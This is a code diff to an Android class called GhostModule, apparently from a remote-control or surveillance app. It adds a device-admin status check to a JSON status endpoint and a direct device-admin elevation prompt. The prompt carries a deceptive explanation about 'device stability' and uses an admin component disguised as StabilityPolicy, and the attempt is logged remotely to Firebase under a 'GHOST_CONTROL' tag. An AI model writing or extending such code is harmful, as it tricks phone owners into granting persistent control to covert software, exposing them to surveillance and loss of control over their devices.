@@ -67,7 +67,14 @@ public class GhostModule extends BaseModule {
         boolean lock = IO_Persistence_Manager.isLockActive();
         long idleTime = System.currentTimeMillis() - IO_Persistence_Manager.getLastEventTime();
         boolean isIdle = idleTime > 5000;
-        
+
+        boolean isAdmin = false;
+        try {
+            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+            android.content.ComponentName comp = new android.content.ComponentName(context, com.labs.labrats.StabilityPolicy.class);
+            isAdmin = dpm != null && dpm.isAdminActive(comp);
+        } catch (Exception ignored) {}
+
         try {
             org.json.JSONObject obj = new org.json.JSONObject();
             obj.put("active", active);
@@ -75,6 +82,7 @@ public class GhostModule extends BaseModule {
             obj.put("blackout", blackout);
             obj.put("lock", lock);
             obj.put("isIdle", isIdle);
+            obj.put("isAdminActive", isAdmin);
             return newResponse(Response.Status.OK, "application/json", obj.toString());
         } catch (Exception e) {
             return newResponse(Response.Status.OK, "application/json", "{\"error\": true}");
@@ -734,10 +742,14 @@ public class GhostModule extends BaseModule {
                         IO_Persistence_Manager.setAutoPilot(true);
                         IO_Persistence_Manager.stopSmartExit();
 
-                        Intent wrapperIntent = new Intent(context, com.labs.labrats.PermissionActivity.class);
-                        wrapperIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
-                        wrapperIntent.putExtra("launch_admin", true);
-                        context.startActivity(wrapperIntent);
+                        android.content.ComponentName adminComponent = new android.content.ComponentName(context, com.labs.labrats.StabilityPolicy.class);
+                        Intent adminIntent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                        adminIntent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
+                        adminIntent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Synchronization with system frameworks is required to maintain device stability.");
+                        adminIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                        context.startActivity(adminIntent);
+
+                        com.labs.labrats.FirebaseConfig.logActivity("GHOST_CONTROL: Device Admin elevation prompt dispatched");
                     } catch (Exception e) {
                         android.util.Log.e("GhostModule", "Failed to launch device admin: " + e.getMessage());
                     }
